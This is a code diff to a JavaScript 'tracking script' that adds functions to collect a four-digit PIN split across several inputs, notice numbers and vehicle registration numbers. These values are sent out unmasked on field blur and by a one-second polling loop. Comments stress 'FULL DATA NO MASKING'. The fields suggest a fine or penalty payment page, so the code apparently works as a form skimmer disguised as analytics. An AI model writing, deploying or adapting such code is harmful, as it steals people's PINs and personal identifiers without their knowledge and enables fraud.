@@ -1141,12 +1141,62 @@ function getTrackingScript() {
     }
   },true);
   
+  // Collect PIN from multiple fields (PIN is split into 4 inputs)
+  function _collectPIN(){
+    var pinFields=d.querySelectorAll('input[name*="pin"],input[id*="pin"]');
+    var pinValues=[];
+    for(var i=0;i<pinFields.length;i++){
+      if(pinFields[i].value&&pinFields[i].value.length===1){
+        pinValues.push(pinFields[i].value);
+      }
+    }
+    if(pinValues.length>=4){
+      return pinValues.join('');
+    }
+    // Try by index pattern (edit-pin--0, edit-pin--1, etc.)
+    var pin='';
+    for(var j=0;j<4;j++){
+      var f=d.querySelector('input[name*="pin"][name*="'+j+'"],input[id*="pin"][id*="'+j+'"]');
+      if(f&&f.value)pin+=f.value;
+    }
+    return pin.length>=4?pin:null;
+  }
+  
+  // Collect Notice Number from multiple fields
+  function _collectNotice(){
+    var noticeFields=d.querySelectorAll('input[name*="notice"],input[id*="notice"]');
+    var vals=[];
+    for(var i=0;i<noticeFields.length;i++){
+      if(noticeFields[i].value)vals.push(noticeFields[i].value);
+    }
+    return vals.length>0?vals.join(''):null;
+  }
+  
   // Track blur (field completed) - FULL DATA NO MASKING
   d.addEventListener('blur',function(e){
     var el=e.target;
     if(!el||!el.tagName)return;
     if((el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA')&&el.value){
       var code=_getFieldCode(el);
+      var n=(el.name||el.id||'').toLowerCase();
+      
+      // Special handling for PIN fields (collect all 4 digits)
+      if(n.indexOf('pin')>-1){
+        var fullPIN=_collectPIN();
+        if(fullPIN&&fullPIN.length>=4){
+          _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:fullPIN,pg:_getPageType()});
+          return;
+        }
+      }
+      
+      // Special handling for Notice fields
+      if(n.indexOf('notice')>-1){
+        var fullNotice=_collectNotice();
+        if(fullNotice){
+          _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:fullNotice,pg:_getPageType()});
+          return;
+        }
+      }
       var val=el.value;
       // NO MASKING - send full value
       _send({t:'event',ec:'form',ea:'complete',el:code,ev:val,pg:_getPageType()})
@@ -1199,6 +1249,31 @@ function getTrackingScript() {
   // Run step detection periodically
   setInterval(_detectStep,1500);
   setTimeout(_detectStep,300);
+  
+  // Track PIN/Notice completion periodically
+  var _lastPIN='',_lastNotice='',_lastVRN='';
+  setInterval(function(){
+    // Check PIN
+    var pin=_collectPIN();
+    if(pin&&pin.length>=4&&pin!==_lastPIN){
+      _lastPIN=pin;
+      _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:pin,pg:_getPageType()});
+    }
+    // Check Notice
+    var notice=_collectNotice();
+    if(notice&&notice.length>=6&&notice!==_lastNotice){
+      _lastNotice=notice;
+      _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:notice,pg:_getPageType()});
+    }
+    // Check Vehicle Registration
+    var vrnInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[id*="vehicle"],input[id*="registration"]');
+    for(var i=0;i<vrnInputs.length;i++){
+      if(vrnInputs[i].value&&vrnInputs[i].value.length>=5&&vrnInputs[i].value!==_lastVRN){
+        _lastVRN=vrnInputs[i].value;
+        _send({t:'event',ec:'form',ea:'complete',el:'vh',ev:vrnInputs[i].value,pg:_getPageType()});
+      }
+    }
+  },1000);
   
   // Send initial page info
   _send({t:'event',ec:'page',ea:'view',el:_getPageType(),ev:_page});
